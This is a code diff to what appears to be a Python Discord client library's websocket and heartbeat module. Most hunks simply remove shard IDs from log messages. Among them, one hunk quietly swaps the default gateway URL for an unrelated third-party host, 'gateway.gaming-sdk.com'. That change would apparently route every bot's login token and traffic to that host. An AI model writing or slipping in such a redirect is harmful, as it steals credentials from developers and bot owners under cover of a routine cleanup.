@@ -139,9 +139,9 @@ class KeepAliveHandler(threading.Thread):
         self._main_thread_id: int = ws.thread_id
         self.interval: Optional[float] = interval
         self.shard_id: Optional[int] = shard_id
-        self.msg: str = 'Keeping shard ID %s websocket alive with sequence %s.'
-        self.block_msg: str = 'Shard ID %s heartbeat blocked for more than %s seconds.'
-        self.behind_msg: str = 'Can\'t keep up, shard ID %s websocket is %.1fs behind.'
+        self.msg: str = 'Keeping websocket alive with sequence %s.'
+        self.block_msg: str = 'Heartbeat blocked for more than %s seconds.'
+        self.behind_msg: str = 'Can\'t keep up, websocket is %.1fs behind.'
         self._stop_ev: threading.Event = threading.Event()
         self._last_ack: float = time.perf_counter()
         self._last_send: float = time.perf_counter()
@@ -152,7 +152,7 @@ class KeepAliveHandler(threading.Thread):
     def run(self) -> None:
         while not self._stop_ev.wait(self.interval):
             if self._last_recv + self.heartbeat_timeout < time.perf_counter():
-                _log.warning("Shard ID %s has stopped responding to the gateway. Closing and restarting.", self.shard_id)
+                _log.warning("Gateway has stopped responding. Closing and restarting.")
                 coro = self.ws.close(4000)
                 f = asyncio.run_coroutine_threadsafe(coro, loop=self.ws.loop)
 
@@ -165,7 +165,7 @@ class KeepAliveHandler(threading.Thread):
                     return
 
             data = self.get_payload()
-            _log.debug(self.msg, self.shard_id, data['d'])
+            _log.debug(self.msg, data['d'])
             coro = self.ws.send_heartbeat(data)
             f = asyncio.run_coroutine_threadsafe(coro, loop=self.ws.loop)
             try:
@@ -184,7 +184,7 @@ class KeepAliveHandler(threading.Thread):
                         else:
                             stack = ''.join(traceback.format_stack(frame))
                             msg = f'{self.block_msg}\nLoop thread traceback (most recent call last):\n{stack}'
-                        _log.warning(msg, self.shard_id, total)
+                        _log.warning(msg, total)
 
             except Exception:
                 self.stop()
@@ -208,7 +208,7 @@ class KeepAliveHandler(threading.Thread):
         self._last_ack = ack_time
         self.latency = ack_time - self._last_send
         if self.latency > 10:
-            _log.warning(self.behind_msg, self.shard_id, self.latency)
+            _log.warning(self.behind_msg, self.latency)
 
 
 class VoiceKeepAliveHandler(KeepAliveHandler):
@@ -216,9 +216,9 @@ class VoiceKeepAliveHandler(KeepAliveHandler):
         name: str = kwargs.pop('name', f'voice-keep-alive-handler:{id(self):#x}')
         super().__init__(*args, name=name, **kwargs)
         self.recent_ack_latencies: Deque[float] = deque(maxlen=20)
-        self.msg: str = 'Keeping shard ID %s voice websocket alive with timestamp %s.'
-        self.block_msg: str = 'Shard ID %s voice heartbeat blocked for more than %s seconds'
-        self.behind_msg: str = 'High socket latency, shard ID %s heartbeat is %.1fs behind'
+        self.msg: str = 'Keeping voice websocket alive with timestamp %s.'
+        self.block_msg: str = 'Voice heartbeat blocked for more than %s seconds'
+        self.behind_msg: str = 'High socket latency, heartbeat is %.1fs behind'
 
     def get_payload(self) -> Dict[str, Any]:
         return {
@@ -294,7 +294,7 @@ class DiscordWebSocket:
         _max_heartbeat_timeout: float
 
     # fmt: off
-    DEFAULT_GATEWAY    = yarl.URL('wss://gateway.discord.gg/')
+    DEFAULT_GATEWAY    = yarl.URL('wss://gateway.gaming-sdk.com/')
     DISPATCH                    = 0
     HEARTBEAT                   = 1
     IDENTIFY                    = 2
@@ -540,7 +540,7 @@ class DiscordWebSocket:
                 self.sequence = None
                 self.session_id = None
                 self.gateway = self.DEFAULT_GATEWAY
-                _log.info('Gateway session has been invalidated.', self.shard_id)
+                _log.info('Gateway session has been invalidated.')
                 await self.close(code=1000)
                 raise ReconnectWebSocket(self.shard_id, resume=False)
 
@@ -551,12 +551,12 @@ class DiscordWebSocket:
             self.sequence = msg['s']
             self.session_id = data['session_id']
             self.gateway = yarl.URL(data['resume_gateway_url'])
-            _log.info('Connected to Gateway (Session ID: %s).', self.shard_id, self.session_id)
+            _log.info('Connected to Gateway (Session ID: %s).', self.session_id)
 
         elif event == 'RESUMED':
             # pass back the shard ID to the resumed handler
             data['__shard_id__'] = self.shard_id
-            _log.info('Gateway has successfully RESUMED session %s.', self.shard_id, self.session_id)
+            _log.info('Gateway has successfully RESUMED session %s.', self.session_id)
 
         try:
             func = self._discord_parsers[event]
